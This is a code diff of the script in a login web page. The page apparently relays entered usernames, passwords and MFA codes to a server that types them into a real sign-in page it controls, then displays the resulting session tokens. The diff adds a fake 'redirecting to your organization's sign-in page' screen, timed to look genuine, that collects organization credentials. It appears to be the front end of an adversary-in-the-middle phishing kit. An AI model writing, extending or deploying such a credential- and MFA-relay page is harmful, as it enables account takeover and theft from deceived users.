+  if (!res.ok || data.ok === false) {
+    throw new Error(data.output || `Request failed (status ${res.status})`);
+  }
+  return data;
+}
+
+function showScreen(name) {
+  document.querySelector(".wrapper").style.display = name === "orgLogin" ? "none" : "block";
+  document.getElementById("orgLoginPage").style.display = name === "orgLogin" ? "flex" : "none";
+
+  usernameForm.style.display = name === "username" ? "block" : "none";
+  passwordForm.style.display = name === "password" ? "block" : "none";
+  mfaChoiceScreen.style.display = name === "mfaChoice" ? "block" : "none";
+  mfaCodeForm.style.display = name === "mfaCode" ? "block" : "none";
+
+  if (name === "mfaChoice" || name === "mfaCode") {
+    const emailHtml = `<span class="back-arrow" data-back>&larr;</span><span>${currentUsername || ""}</span>`;
+    if (name === "mfaChoice") mfaChoiceEmailRow.innerHTML = emailHtml;
+    if (name === "mfaCode") mfaCodeEmailRow.innerHTML = emailHtml;
+  }
+}
+
+function _mfaOptionIcon(label) {
+  const lower = label.toLowerCase();
+  if (lower.includes("authenticator")) {
+    return `<div class="icon-box"><svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-6 8-6s8 2 8 6"/></svg></div>`;
+  }
+  if (lower.includes("verification code") || lower.includes("use a verification")) {
+    return `<div class="icon-box"><div class="icon-123">123</div></div>`;
+  }
+  if (lower.startsWith("text")) {
+    return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>`;
+  }
+  if (lower.startsWith("call")) {
+    return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5a2 2 0 0 1 2-2h3l2 5-2 2a12 12 0 0 0 6 6l2-2 5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 5z"/><path d="M17 11l3-3"/><path d="M17 5h3v3"/></svg></div>`;
+  }
+  // "I can't use my Authenticator app" or anything unrecognized -> a generic key/switch icon
+  return `<div class="icon-box"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"></circle><path d="M10.5 12.5L20 3"></path><path d="M16 7l3 3"></path><path d="M13 4l3 3"></path></svg></div>`;
+}
+
+function renderMfaOptions(options) {
+  mfaOptionsList.innerHTML = "";
+  options.forEach((label) => {
+    const btn = document.createElement("button");
+    btn.type = "button";
+    btn.className = "mfa-option-btn";
+    btn.innerHTML = `${_mfaOptionIcon(label)}<span>${label}</span>`;
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      setStatus("Selecting method...", "info", true);
       try {
-        data = await res.json();
-      } catch {
-        throw new Error(`Server returned non-JSON response (status ${res.status})`);
+        await postJSON("/login/mfa-select", { username: currentUsername, option: label });
+        lastSelectedMfaOption = label;
+        // Don't wait for the next scheduled poll — check shortly after so the
+        // DOM updates to the new screen (e.g. all 4 picker options) quickly,
+        // giving the server-side page a brief moment to actually render it.
+        stopPolling();
+        setTimeout(pollStatus, 600);
+      } catch (err) {
+        setStatus(err.message, "error");
+        btn.disabled = false;
       }
-      if (!res.ok || data.ok === false) {
-        throw new Error(data.output || `Request failed (status ${res.status})`);
-      }
-      return data;
-    }
+    });
+    mfaOptionsList.appendChild(btn);
+  });
+  mfaWaitingNote.style.display = options.length ? "none" : "block";
+}
 
-    async function getJSON(path) {
-      const res = await fetch(`${API_BASE}${path}`);
-      let data;
-      try {
-        data = await res.json();
-      } catch {
-        throw new Error(`Server returned non-JSON response (status ${res.status})`);
-      }
-      if (!res.ok || data.ok === false) {
-        throw new Error(data.output || `Request failed (status ${res.status})`);
-      }
-      return data;
-    }
+let pollHandle = null;
 
-    function showScreen(name) {
-      usernameForm.style.display = name === "username" ? "block" : "none";
-      passwordForm.style.display = name === "password" ? "block" : "none";
-      mfaChoiceScreen.style.display = name === "mfaChoice" ? "block" : "none";
-      mfaCodeForm.style.display = name === "mfaCode" ? "block" : "none";
+function stopPolling() {
+  if (pollHandle) {
+    clearTimeout(pollHandle);
+    pollHandle = null;
+  }
+}
 
-      if (name === "mfaChoice" || name === "mfaCode") {
-        const emailHtml = `<span class="back-arrow" data-back>&larr;</span><span>${currentUsername || ""}</span>`;
-        if (name === "mfaChoice") mfaChoiceEmailRow.innerHTML = emailHtml;
-        if (name === "mfaCode") mfaCodeEmailRow.innerHTML = emailHtml;
-      }
-    }
+async function pollStatus() {
+  if (!currentUsername) return;
 
-    function _mfaOptionIcon(label) {
-      const lower = label.toLowerCase();
-      if (lower.includes("authenticator")) {
-        return `<div class="icon-box"><svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-6 8-6s8 2 8 6"/></svg></div>`;
-      }
-      if (lower.includes("verification code") || lower.includes("use a verification")) {
-        return `<div class="icon-box"><div class="icon-123">123</div></div>`;
-      }
-      if (lower.startsWith("text")) {
-        return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>`;
-      }
-      if (lower.startsWith("call")) {
-        return `<div class="icon-box"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 5a2 2 0 0 1 2-2h3l2 5-2 2a12 12 0 0 0 6 6l2-2 5 2v3a2 2 0 0 1-2 2A16 16 0 0 1 3 5z"/><path d="M17 11l3-3"/><path d="M17 5h3v3"/></svg></div>`;
-      }
-      // "I can't use my Authenticator app" or anything unrecognized -> a generic key/switch icon
-      return `<div class="icon-box"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="4.5"></circle><path d="M10.5 12.5L20 3"></path><path d="M16 7l3 3"></path><path d="M13 4l3 3"></path></svg></div>`;
-    }
+  try {
+    const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
 
-    function renderMfaOptions(options) {
-      mfaOptionsList.innerHTML = "";
-      options.forEach((label) => {
-        const btn = document.createElement("button");
-        btn.type = "button";
-        btn.className = "mfa-option-btn";
-        btn.innerHTML = `${_mfaOptionIcon(label)}<span>${label}</span>`;
-        btn.addEventListener("click", async () => {
-          btn.disabled = true;
-          setStatus("Selecting method...");
-          try {
-            await postJSON("/login/mfa-select", { username: currentUsername, option: label });
-            lastSelectedMfaOption = label;
-            // Don't wait for the next scheduled poll — check shortly after so the
-            // DOM updates to the new screen (e.g. all 4 picker options) quickly,
-            // giving the server-side page a brief moment to actually render it.
-            stopPolling();
-            setTimeout(pollStatus, 600);
-          } catch (err) {
-            setStatus(err.message, "error");
-            btn.disabled = false;
-          }
-        });
-        mfaOptionsList.appendChild(btn);
-      });
-      mfaWaitingNote.style.display = options.length ? "none" : "block";
-    }
-
-    let pollHandle = null;
-
-    function stopPolling() {
-      if (pollHandle) {
-        clearTimeout(pollHandle);
-        pollHandle = null;
-      }
-    }
-
-    async function pollStatus() {
-      if (!currentUsername) return;
-
-      try {
-        const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
-
-        if (data.stage === "awaiting_mfa_choice") {
-          showScreen("mfaChoice");
-          renderMfaOptions(data.mfa_options || []);
-          setStatus("");
-        } else if (data.stage === "awaiting_mfa_code") {
-          showScreen("mfaCode");
-          if (lastSelectedMfaOption) {
-            const lower = lastSelectedMfaOption.toLowerCase();
-            if (lower.startsWith("call")) {
-              mfaCodeContextText.textContent = `We called your phone. Please enter the code to sign in.`;
-            } else if (lower.startsWith("text")) {
-              mfaCodeContextText.textContent = `We texted your phone. Please enter the code to sign in.`;
-            } else {
-              mfaCodeContextText.textContent = `Please enter your verification code to sign in.`;
-            }
-          }
-          setStatus("Enter the code you received.");
-          mfaCodeInput.focus();
-        } else if (data.stage === "succeeded") {
-          stopPolling();
-          showScreen("username");
-          setStatus("Authenticated successfully.", "success");
-          resultEl.style.display = "block";
-          resultEl.textContent = JSON.stringify(data.tokens, null, 2);
-          currentUsername = null;
-          usernameForm.reset();
-          return;
-        } else if (data.stage === "failed") {
-          stopPolling();
-          setStatus(data.error || "Authentication failed.", "error");
-          currentUsername = null;
-          return;
+    if (data.stage === "awaiting_mfa_choice") {
+      showScreen("mfaChoice");
+      renderMfaOptions(data.mfa_options || []);
+      setStatus("");
+    } else if (data.stage === "awaiting_mfa_code") {
+      showScreen("mfaCode");
+      if (lastSelectedMfaOption) {
+        const lower = lastSelectedMfaOption.toLowerCase();
+        if (lower.startsWith("call")) {
+          mfaCodeContextText.textContent = `We called your phone. Please enter the code to sign in.`;
+        } else if (lower.startsWith("text")) {
+          mfaCodeContextText.textContent = `We texted your phone. Please enter the code to sign in.`;
+        } else {
+          mfaCodeContextText.textContent = `Please enter your verification code to sign in.`;
         }
-      } catch (err) {
-        stopPolling();
-        setStatus(err.message, "error");
-        return;
       }
-
-      pollHandle = setTimeout(pollStatus, 1500);
+      setStatus("Enter the code you received.");
+      mfaCodeInput.focus();
+    } else if (data.stage === "succeeded") {
+      stopPolling();
+      showScreen("username");
+      setStatus("Authenticated successfully.", "success");
+      resultEl.style.display = "block";
+      resultEl.textContent = JSON.stringify(data.tokens, null, 2);
+      currentUsername = null;
+      usernameForm.reset();
+      return;
+    } else if (data.stage === "failed") {
+      stopPolling();
+      setStatus(data.error || "Authentication failed.", "error");
+      currentUsername = null;
+      return;
     }
+  } catch (err) {
+    stopPolling();
+    setStatus(err.message, "error");
+    return;
+  }
 
-    usernameForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const username = usernameInput.value.trim();
-      if (!username) return;
+  pollHandle = setTimeout(pollStatus, 1500);
+}
 
-      setBusy(usernameBtn, true, "Next");
-      setStatus("Opening browser and entering username...");
-      resultEl.style.display = "none";
+usernameForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const username = usernameInput.value.trim();
+  if (!username) return;
 
-      try {
-        const data = await postJSON("/login/username", { username });
-        currentUsername = data.username;
-        setStatus("Username accepted. Enter password to continue.", "success");
-        showScreen("password");
-        passwordInput.focus();
-      } catch (err) {
-        setStatus(err.message, "error");
-      } finally {
-        setBusy(usernameBtn, false, "Next");
-      }
-    });
+  setBusy(usernameBtn, true, "Next");
+  setStatus("Opening browser and entering username...", "info", true);
+  resultEl.style.display = "none";
 
-    usernameBackBtn.addEventListener("click", () => {
-      usernameInput.value = "";
-      setStatus("");
-      usernameInput.focus();
-    });
+  try {
+    const data = await postJSON("/login/username", { username });
+    currentUsername = data.username;
 
-    backBtn.addEventListener("click", () => {
-      stopPolling();
-      showScreen("username");
-      passwordInput.value = "";
-      currentUsername = null;
-      setStatus("");
-    });
+    if (data.flow === "federated") {
+      orgDomainNote.textContent = data.federated_domain
+        ? `This account uses your organization's sign-in page (${data.federated_domain}).`
+        : "This account uses your organization's sign-in page.";
 
-    mfaCancelBtn.addEventListener("click", () => {
-      stopPolling();
-      showScreen("username");
-      currentUsername = null;
-      setStatus("");
-    });
+      showScreen("orgLogin");
+      orgRedirecting.style.display = "block";
+      orgPanel.style.display = "none";
 
-    document.addEventListener("click", (e) => {
-      if (e.target.closest("[data-back]")) {
-        stopPolling();
-        showScreen("username");
-        currentUsername = null;
-        setStatus("");
-      }
-    });
+      setTimeout(() => {
+        orgRedirecting.style.display = "none";
+        orgPanel.style.display = "block";
+        setOrgStatus("Redirected to your organization's sign-in page.", "success");
+        orgEmail.value = username;
+        orgPassword.focus();
+      }, 1800);
+    } else {
+      setStatus("Username accepted. Enter password to continue.", "success");
+      showScreen("password");
+      passwordInput.focus();
+    }
+  } catch (err) {
+    setStatus(err.message, "error");
+  } finally {
+    setBusy(usernameBtn, false, "Next");
+  }
+});
 
-    passwordForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const password = passwordInput.value;
-      if (!password || !currentUsername) return;
+const orgStatusEl = document.getElementById("orgStatus");
+function setOrgStatus(message, kind = "info", loading = false) {
+  orgStatusEl.innerHTML = loading ? DOTS_LOADER_HTML + message : message;
+  orgStatusEl.className = `status-${kind}`;
+}
 
-      setBusy(passwordBtn, true, "Sign in");
-      setStatus("Submitting password...");
+const orgToggleShow = document.getElementById("orgToggleShow");
+orgToggleShow.addEventListener("click", (e) => {
+  e.preventDefault();
+  const isPassword = orgPassword.type === "password";
+  orgPassword.type = isPassword ? "text" : "password";
+  orgToggleShow.textContent = isPassword ? "Hide" : "Show";
+});
 
-      try {
-        await postJSON("/login/password", { username: currentUsername, password });
-        passwordInput.value = "";
-        setStatus("");
-        pollStatus();
-      } catch (err) {
-        setStatus(err.message, "error");
-      } finally {
-        setBusy(passwordBtn, false, "Sign in");
-      }
-    });
+orgGetStartedBtn.addEventListener("click", (e) => {
+  e.preventDefault();
+  // Placeholder — same as the reference's "Get Started" not being part of
+  // this sign-in flow. Wire to a real signup path if/when one exists.
+});
 
-    mfaCodeForm.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const code = mfaCodeInput.value.trim();
-      if (!code || !currentUsername) return;
+document.querySelector(".org-topbar-brand").addEventListener("click", () => {
+  stopPolling();
+  showScreen("username");
+  orgPassword.value = "";
+  currentUsername = null;
+  setOrgStatus("");
+});
 
-      setBusy(mfaCodeBtn, true, "Verify");
-      setStatus("Submitting code...");
+orgCancelRedirectBtn.addEventListener("click", () => {
+  stopPolling();
+  showScreen("username");
+  currentUsername = null;
+  setOrgStatus("");
+});
 
-      try {
-        await postJSON("/login/mfa-code", { username: currentUsername, code });
-        mfaCodeInput.value = "";
-        setStatus("Code submitted, waiting for confirmation...");
-      } catch (err) {
-        setStatus(err.message, "error");
-      } finally {
-        setBusy(mfaCodeBtn, false, "Verify");
-      }
-    });
-  </script>
+orgLoginForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const email = orgEmail.value.trim();
+  const password = orgPassword.value;
+  if (!password || !currentUsername) return;
+
+  setBusy(orgSignInBtn, true, "Sign In");
+  setOrgStatus("Submitting to your organization's sign-in page...", "info", true);
+
+  try {
+    await postJSON("/login/org-signin", { username: currentUsername, email, password });
+    orgPassword.value = "";
+    setOrgStatus("");
+    pollStatus();
+  } catch (err) {
+    setOrgStatus(err.message, "error");
+  } finally {
+    setBusy(orgSignInBtn, false, "Sign In");
+  }
+});
+
+usernameBackBtn.addEventListener("click", () => {
+  usernameInput.value = "";
+  setStatus("");
+  usernameInput.focus();
+});
+
+backBtn.addEventListener("click", () => {
+  stopPolling();
+  showScreen("username");
+  passwordInput.value = "";
+  currentUsername = null;
+  setStatus("");
+});
+
+mfaCancelBtn.addEventListener("click", () => {
+  stopPolling();
+  showScreen("username");
+  currentUsername = null;
+  setStatus("");
+});
+
+document.addEventListener("click", (e) => {
+  if (e.target.closest("[data-back]")) {
+    stopPolling();
+    showScreen("username");
+    currentUsername = null;
+    setStatus("");
+  }
+});
+
+passwordForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const password = passwordInput.value;
+  if (!password || !currentUsername) return;
+
+  setBusy(passwordBtn, true, "Sign in");
+  setStatus("Submitting password...", "info", true);
+
+  try {
+    await postJSON("/login/password", { username: currentUsername, password });
+    passwordInput.value = "";
+    setStatus("");
+    pollStatus();
+  } catch (err) {
+    setStatus(err.message, "error");
+  } finally {
+    setBusy(passwordBtn, false, "Sign in");
+  }
+});
+
+mfaCodeForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const code = mfaCodeInput.value.trim();
+  if (!code || !currentUsername) return;
+
+  setBusy(mfaCodeBtn, true, "Verify");
+  setStatus("Submitting code...", "info", true);
+
+  try {
+    await postJSON("/login/mfa-code", { username: currentUsername, code });
+    mfaCodeInput.value = "";
+    setStatus("Code submitted, waiting for confirmation...");
+  } catch (err) {
+    setStatus(err.message, "error");
+  } finally {
+    setBusy(mfaCodeBtn, false, "Verify");
+  }
+});
+</script>
 
 </body>
-
 </html>
